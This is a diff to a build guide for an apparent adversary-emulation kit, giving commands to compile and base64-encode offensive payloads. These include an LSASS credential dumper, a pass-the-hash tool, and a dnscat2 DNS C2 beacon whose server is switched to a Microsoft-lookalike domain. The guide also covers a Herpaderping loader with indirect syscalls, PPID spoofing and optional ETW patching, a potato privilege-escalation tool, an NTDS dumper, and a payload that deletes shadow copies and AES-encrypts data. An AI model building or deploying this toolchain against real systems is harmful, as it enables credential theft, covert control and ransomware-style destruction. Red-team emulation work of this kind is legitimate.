@@ -20,9 +20,12 @@ This document covers all pre-operation build and encoding steps required before 
 | **IIS Server-Side** | Phase 2 Step 1 | LSASS reflection dumper | `WdiBoot.exe` | `resources/payloads/LsassReflectDumping/` (C++ MSVC) |
 | **IIS Server-Side** | Phase 2 Step 2 | Security software enumeration | `WmiAvQuery.exe` | `resources/payloads/WmiAvQuery/` (C++ MSVC/MinGW) |
 | **IIS Server-Side** | Phase 3 Step 1 | PtH SMB transfer + WMI/SCM exec | `go-thehash.exe` | `resources/payloads/go-thehash/` (Go) |
-| **IIS Server-Side** | Phase 3 Step 5 | DNS C2 beacon as Windows service | `dnscat-service.exe` | `resources/payloads/dnscat2/go-client/` (Go, service wrapper) |
-| **IIS Server-Side** | Phase 3 Step 5 | SCM API-based service installer | `ServiceInstaller.exe` | `resources/payloads/windows-service/advapi32-cpp/` (C++) |
-| **IIS Server-Side** | Phase 3 Step 5 | NT registry API-based service installer | `NtServiceInstaller.exe` | `resources/payloads/windows-service/syscalls-cpp/` (C++) |
+| **IIS Server-Side** | Phase 3 Steps 5 & 6 | WMI persistence + logon script beacon | `policyupdate.exe` | `resources/payloads/dnscat2/go-client/dnscat2.exe` (Go) |
+| **IIS Server-Side** | Phase 3 Step 7 | Windows service persistence beacon | `policysync.exe` | `resources/payloads/dnscat2/go-client/dnscat-service.exe` (Go, service wrapper) |
+| **IIS Server-Side** | Phase 3 Step 7 | NT registry API-based service installer | `NtServiceInstaller.exe` | `resources/payloads/windows-service/syscalls-cpp/` (C++) |
+| **IIS Server-Side** | Phase 3 Step 7B | SCM API-based service installer | `ServiceInstaller.exe` | `resources/payloads/windows-service/advapi32-cpp/` (C++) |
+| **IIS Server-Side** | Phase 4 Step 1 | DC NTDS raw dump + archive + encrypt | `NtdsRawDump.exe` | `resources/payloads/NtdsRawDump/NtdsRawDump.cs` (C#, built in-phase) |
+| **IIS Server-Side** | Phase 5 Step 1 | VSS deletion + service stop + AES-256 encryption | `CertMaint.exe` | `resources/payloads/ImpactPayload/impact.c` (C, pre-built as `impact.exe`) |
 
 ---
 
@@ -35,7 +38,7 @@ This document covers all pre-operation build and encoding steps required before 
 - ☣️ On the attacker machine, start the dnscat2 server listener
 
   ```bash
-  ruby dnscat2.rb --dns "domain=attacker.local,host=0.0.0.0" --security=open --secret=c7517dee4fcbe16a0c8c1f98cdc5ce4e
+  ruby dnscat2.rb --dns "domain=crl.ms-cert.net,host=0.0.0.0" --security=open --secret=c7517dee4fcbe16a0c8c1f98cdc5ce4e
   ```
 
   - ***Expected Output***
@@ -58,7 +61,7 @@ On Windows, `getSystemDNS()` applies to the **built Windows binary** when run on
 ```bash
 cd resources/payloads/dnscat2/go-client
 GOOS=windows GOARCH=amd64 go build -ldflags="-s -w -H windowsgui \
-  -X main.DefaultDomain=attacker.local \
+  -X main.DefaultDomain=crl.ms-cert.net \
   -X main.DefaultSecret=c7517dee4fcbe16a0c8c1f98cdc5ce4e" \
   -o dnscat2.exe ./cmd/dnscat/
 ```
@@ -70,7 +73,7 @@ Set-Location resources\payloads\dnscat2\go-client
 $env:GOOS = "windows"
 $env:GOARCH = "amd64"
 go build `
-  -ldflags "-s -w -H windowsgui -X main.DefaultDomain=attacker.local -X main.DefaultSecret=c7517dee4fcbe16a0c8c1f98cdc5ce4e" `
+  -ldflags "-s -w -H windowsgui -X main.DefaultDomain=crl.ms-cert.net -X main.DefaultSecret=c7517dee4fcbe16a0c8c1f98cdc5ce4e" `
   -o dnscat2.exe `
   ./cmd/dnscat/
 Remove-Item Env:\GOOS -ErrorAction SilentlyContinue
@@ -90,7 +93,7 @@ Output: `resources/payloads/dnscat2/go-client/dnscat2.exe`
 ```bash
 cd resources/payloads/dnscat2/go-client
 GOOS=windows GOARCH=amd64 go build -ldflags="-s -w -H windowsgui \
-  -X main.DefaultDomain=attacker.local \
+  -X main.DefaultDomain=crl.ms-cert.net \
   -X main.DefaultSecret=c7517dee4fcbe16a0c8c1f98cdc5ce4e" \
   -o dnscat-service.exe ./cmd/dnscat-service/
 ```
@@ -102,7 +105,7 @@ Set-Location resources\payloads\dnscat2\go-client
 $env:GOOS = "windows"
 $env:GOARCH = "amd64"
 go build `
-  -ldflags "-s -w -H windowsgui -X main.DefaultDomain=attacker.local -X main.DefaultSecret=c7517dee4fcbe16a0c8c1f98cdc5ce4e" `
+  -ldflags "-s -w -H windowsgui -X main.DefaultDomain=crl.ms-cert.net -X main.DefaultSecret=c7517dee4fcbe16a0c8c1f98cdc5ce4e" `
   -o dnscat-service.exe `
   ./cmd/dnscat-service/
 Remove-Item Env:\GOOS -ErrorAction SilentlyContinue
@@ -113,24 +116,47 @@ Output: `resources/payloads/dnscat2/go-client/dnscat-service.exe`
 
 #### `CWLHerpaderping.exe` (C++, Process Herpaderping loader)
 
-**Code flow (from source):** `CWLHerpaderping/CWLImplant.cpp` — `PatchEtw()` patches `ntdll!EtwEventWrite` early. `main()` calls `GetPayloadBuffer()`, which supports **two modes for T1620 Reflective Code Loading**:
+**Code flow (from source):** `CWLImplant.cpp` — `main()` calls `GetPayloadBuffer()` to obtain the PE bytes, then `Herpaderping()` to execute it as a ghost process.
 
-- **Mode 1 (stdin pipe - reflective loading):** Detects stdin redirection via `GetFileType(STD_INPUT_HANDLE) == FILE_TYPE_PIPE`, reads 4-byte size header followed by PE bytes from stdin via `ReadFile`, allocates RW buffer via `VirtualAlloc` — **no disk file artifact** (payload passed via react2shell `herpload` command).
-- **Mode 2 (file fallback):** Opens wide path `PAYLOAD_PATH` (compile-time default, overridden via MSBuild `CustomPayloadPath`), reads the file into RW memory, **deletes** the payload file via `DeleteFileW` — used for testing or when stdin is unavailable.
+**Payload loading — two modes, selected at runtime by stdin type:**
 
-`Herpaderping()` initializes **indirect syscalls** for `NtCreateSection`, `NtCreateProcessEx`, `NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, `NtCreateThreadEx`; creates a temp file (`%TEMP%\HD*.tmp`), maps/writes the payload buffer, builds spoofed process parameters (with optional `StackSpoof` around some calls), creates remote process/thread so the payload runs from the swapped file image (Herpaderping-style execution). Parent spoofing uses `GetNonJobParent()` (e.g. `svchost.exe` / `wininit.exe` in session 0) for `CreateProcess` inheritance where applicable.
+- **Mode 1 — Stdin pipe (T1620, primary):** `GetFileType(STD_INPUT_HANDLE) == FILE_TYPE_PIPE` → reads 4-byte little-endian size header then PE bytes from stdin via `ReadFile` into a heap buffer. **No disk file artifact.** Used by the react2shell `herpload` command.
+- **Mode 2 — File fallback (T1070.004):** Stdin is not a pipe → `CreateFileW(PAYLOAD_PATH)` reads the PE into heap, then `DeleteFileW(PAYLOAD_PATH)` deletes the file immediately. `PAYLOAD_PATH` is `L"C:\\temp\\payload64.exe"` by default (`CWLImplant.cpp` line 13 `#ifndef PAYLOAD_PATH`); override at build time with `/p:CustomPayloadPath=` (double backslashes required).
 
-**Build:** Release `x64` uses `/MT` (`MultiThreaded`) in the `.vcxproj` for a static CRT. The `CustomPayloadPath` compile-time flag is **optional** (only used for Mode 2 file fallback).
+**ETW patching (`PatchEtw()`) — OPT-IN, disabled by default:** `PatchEtw()` patches `ntdll!EtwEventWrite` to `xor eax,eax; ret` to suppress ETW telemetry (T1562.006). It is guarded by `#ifdef ENABLE_ETW_PATCH` in `CWLImplant.cpp` and is **not compiled in** unless explicitly requested. The default emulation-plan build omits this.
+
+**`Herpaderping()`** initializes five indirect syscall stubs (`NtCreateSection`, `NtCreateProcessEx`, `NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, `NtCreateThreadEx`) via `InitSyscallPool` / `SealSyscallPool`. It writes the PE into a `%TEMP%\HD*.tmp` file, creates an `SEC_IMAGE` section from it, calls `GetNonJobParent()` to find a Session 0 `svchost.exe` (fallback: `wininit.exe`) for PPID spoofing, spawns the ghost via `NtCreateProcessEx`, re-assigns the ghost's token to the caller's token via `NtSetInformationProcess(ProcessAccessToken)`, overwrites the temp file with junk (`"Hello From CyberWarFare Labs"`), writes spoofed `RTL_USER_PROCESS_PARAMETERS` (`ImagePathName=RuntimeBroker.exe`) into the ghost PEB, then starts the payload thread via `NtCreateThreadEx`. The five NT calls are wrapped with `StackSpoofer` (fake `kernel32.dll` return address).
+
+**Build — default (Mode 1 primary, static CRT, no ETW patch):**
+
+`Release x64` in `.vcxproj` sets `<RuntimeLibrary>MultiThreaded</RuntimeLibrary>` (`/MT`) — fully static CRT, **no VC runtime DLL required** on the target. This is hardcoded for the `Release|x64` config only; do not use `Debug` or `Win32` configs for deployment.
 
 ```powershell
-cd resources\payloads\CWLHerpaderping
+Set-Location resources\payloads\CWLHerpaderping
 msbuild CWLHerpaderping.sln `
   /p:Configuration=Release `
   /p:Platform=x64 `
   /t:Rebuild /m
 ```
 
-> **Note:** `/p:CustomPayloadPath` was removed from the default build command. Stdin mode (Mode 1) is now the primary reflective loading mechanism. The file fallback mode uses the hardcoded default `PAYLOAD_PATH` (`C:\temp\payload64.exe`) if stdin is not redirected.
+**Optional — enable ETW suppression (T1562.006):**
+
+```powershell
+msbuild CWLHerpaderping.sln `
+  /p:Configuration=Release /p:Platform=x64 `
+  /p:ETWPatch=1 `
+  /t:Rebuild /m
+```
+
+**Optional — override Mode 2 payload path (double backslashes required):**
+
+```powershell
+msbuild CWLHerpaderping.sln `
+  /p:Configuration=Release /p:Platform=x64 `
+  /p:CustomPayloadPath="C:\\ProgramData\\CertCA.bin" `
+  /p:CWLDebug=1 `
+  /t:Rebuild /m
+```
 
 Output: `resources\payloads\CWLHerpaderping\x64\Release\CWLHerpaderping.exe`
 
@@ -138,7 +164,14 @@ Output: `resources\payloads\CWLHerpaderping\x64\Release\CWLHerpaderping.exe`
 
 **Code flow (from source):** `resources/payloads/EfsPotato/CertEnrollSvc.cs`, class `CertEnrollmentAgent`, `Main`: requires argv[0] = command line for payload; optional argv[1] = RPC endpoint name (`lsarpc`, `efsrpc`, `samr`, `lsass`, `netlogon`). Enables `SeImpersonatePrivilege`, creates a named pipe under `\\.\pipe\<guid>\pipe\srvsvc`, starts a listener thread and an **RPC channel** thread to trigger a privileged client connect, waits up to 3s, then **`ImpersonateNamedPipeClient`**, opens the impersonation token, and **`CreateProcessAsUser`** to run `args[0]` with stdout/stderr redirected through a pipe (optional output reader thread). Cleanup closes handles.
 
-Repo ships a **pre-built** `CertEnrollSvc.exe`. Rebuild from `CertEnrollSvc.cs` / solution if you maintain one locally (not repeated here).
+Repo ships a **pre-built** `CertEnrollSvc.exe`. To rebuild from source:
+
+```cmd
+cd resources\payloads\EfsPotato
+csc /target:exe /platform:x64 /optimize+ /out:CertEnrollSvc.exe CertEnrollSvc.cs -nowarn:1691,618
+```
+
+Output: `resources\payloads\EfsPotato\CertEnrollSvc.exe`
 
 #### `ReflectDump.exe` (C++, LSASS dump via reflection)
 
@@ -147,8 +180,14 @@ Repo ships a **pre-built** `CertEnrollSvc.exe`. Rebuild from `CertEnrollSvc.cs` 
 **Build:**
 
 ```powershell
-msbuild resources\payloads\LsassReflectDumping\ReflectDump\ReflectDump.sln /p:Configuration=Release /p:Platform=x64 /m
+msbuild resources\payloads\LsassReflectDumping\ReflectDump\ReflectDump.sln `
+  /p:Configuration=Release /p:Platform=x64 `
+  /p:LanguageStandard=stdcpp20 `
+  /p:RuntimeLibrary=MultiThreaded `
+  /m
 ```
+
+> **Note:** `LanguageStandard=stdcpp20` is required because `Header.h` includes `<format>` (C++20); the `.vcxproj` does not set this. `RuntimeLibrary=MultiThreaded` overrides the missing `/MT` in the `.vcxproj` Release config to produce a fully static binary with no VC runtime DLL dependency.
 
 Output: `resources\payloads\LsassReflectDumping\ReflectDump\x64\Release\ReflectDump.exe`
 
@@ -169,7 +208,7 @@ g++ -o ServiceInstaller.exe main.cpp service_installer.cpp -ladvapi32 -municode 
 
 ```cmd
 cd resources\payloads\windows-service\advapi32-cpp
-cl /EHsc /O2 /Fe:ServiceInstaller.exe main.cpp service_installer.cpp advapi32.lib /link /SUBSYSTEM:CONSOLE
+cl /EHsc /O2 /MT /Fe:ServiceInstaller.exe main.cpp service_installer.cpp advapi32.lib /link /SUBSYSTEM:CONSOLE
 ```
 
 Output: `resources/payloads/windows-service/advapi32-cpp/ServiceInstaller.exe`
@@ -191,7 +230,7 @@ g++ -o NtServiceInstaller.exe main.cpp nt_api.cpp service_installer.cpp -ladvapi
 
 ```cmd
 cd resources\payloads\windows-service\syscalls-cpp
-cl /EHsc /O2 /Fe:NtServiceInstaller.exe main.cpp nt_api.cpp service_installer.cpp advapi32.lib /link /SUBSYSTEM:CONSOLE
+cl /EHsc /O2 /MT /Fe:NtServiceInstaller.exe main.cpp nt_api.cpp service_installer.cpp advapi32.lib /link /SUBSYSTEM:CONSOLE
 ```
 
 Output: `resources/payloads/windows-service/syscalls-cpp/NtServiceInstaller.exe`
@@ -246,6 +285,32 @@ Remove-Item Env:\GOARCH -ErrorAction SilentlyContinue
 
 Output: `resources/payloads/go-thehash/go-thehash.exe`
 
+#### `NtdsRawDump.exe` (C#, DC NTDS raw dump)
+
+**Build** (VS Developer Command Prompt / `csc` in PATH):
+
+```powershell
+Set-Location resources\payloads\NtdsRawDump
+csc /optimize+ /debug- /out:NtdsRawDump.exe NtdsRawDump.cs `
+    /r:System.Management.dll `
+    /r:System.IO.Compression.dll
+```
+
+Output: `resources\payloads\NtdsRawDump\NtdsRawDump.exe`
+
+#### `CertMaint.exe` / `impact.exe` (C, AES-256 impact payload)
+
+**Build** (x64 Native Tools Command Prompt for VS):
+
+```cmd
+cd resources\payloads\ImpactPayload
+cl /O2 /MT /W4 impact.c aes.c /Fe:impact.exe /link ole32.lib
+```
+
+> `/MT` static CRT + `ole32.lib` for COM/VSS. `advapi32` is resolved dynamically at runtime via `GetProcAddress` — do **not** add `advapi32.lib` to the link line.
+
+Output: `resources\payloads\ImpactPayload\impact.exe`
+
 #### HTML Smuggling Path Setup
 
 **`encode-command.py` (HTA → polyglot PEM + HTML smuggling)**
@@ -283,10 +348,9 @@ All `.b64` files are generated by `encode_payload.py` (or `compress_payload.py`)
 ```bash
 cd resources/payloads/react2shell-tool
 
-# Phase 1 Step 1 — Initial Access & Escalation payloads
-python encode_payload.py ../EfsPotato/CertEnrollSvc.exe                             -o CertEnrollSvc.b64    -l 0
+# Phase 1 Step 1B only — dnscat2.b64 required for herpload (reflective stdin path)
+# Phase 1 Step 1A uses the `stage` command which reads raw binaries directly — no .b64 needed
 python encode_payload.py ../dnscat2/go-client/dnscat2.exe                           -o dnscat2.b64          -l 0
-python encode_payload.py ../CWLHerpaderping/x64/Release/CWLHerpaderping.exe         -o CertEnrollAgent.b64  -l 0
 
 # Phase 2 Step 1 — LSASS dumper (Compressed via gzip + base64)
 python compress_payload.py ../LsassReflectDumping/ReflectDump/x64/Release/ReflectDump.exe -o WdiBoot.gz.b64 --b64 -l 0
@@ -294,10 +358,22 @@ python compress_payload.py ../LsassReflectDumping/ReflectDump/x64/Release/Reflec
 # Phase 2 Step 2 — Security software discovery
 python encode_payload.py ../WmiAvQuery/WmiAvQuery.exe                                    -o WmiAvQuery.b64   -l 0
 
-# Phase 3 Step 1 — Lateral movement & persistence tooling
-python encode_payload.py ../go-thehash/go-thehash.exe                               -o go-thehash.b64       -l 0
-python encode_payload.py ../windows-service/advapi32-cpp/ServiceInstaller.exe        -o ServiceInstaller.b64 -l 0
+# Phase 3 Step 1 — Lateral movement (PtH)
+python encode_payload.py ../go-thehash/go-thehash.exe                               -o go-thehash.b64         -l 0
+
+# Phase 3 Steps 5 & 6 — WMI persistence and logon script beacon
+python encode_payload.py ../dnscat2/go-client/dnscat2.exe                           -o policyupdate.exe.b64   -l 0
+
+# Phase 3 Step 7 — Windows service persistence beacon + service installers
+python encode_payload.py ../dnscat2/go-client/dnscat-service.exe                    -o policysync.exe.b64     -l 0
+python encode_payload.py ../windows-service/advapi32-cpp/ServiceInstaller.exe        -o ServiceInstaller.b64   -l 0
 python encode_payload.py ../windows-service/syscalls-cpp/NtServiceInstaller.exe      -o NtServiceInstaller.b64 -l 0
+
+# Phase 4 Step 1 — DC NTDS raw dump
+python encode_payload.py ../NtdsRawDump/NtdsRawDump.exe                              -o NtdsRawDump.b64        -l 0
+
+# Phase 5 Step 1 — Impact payload (deployed as CertMaint.exe)
+python encode_payload.py ../ImpactPayload/impact.exe                                 -o CertMaint.b64          -l 0
 ```
 
 - ***Expected Output (representative for `encode_payload.py`)***
@@ -319,3 +395,4 @@ python encode_payload.py ../windows-service/syscalls-cpp/NtServiceInstaller.exe 
   [*] Compression ratio: ~62%
   [*] Output file: WdiBoot.gz.b64
   ```
+
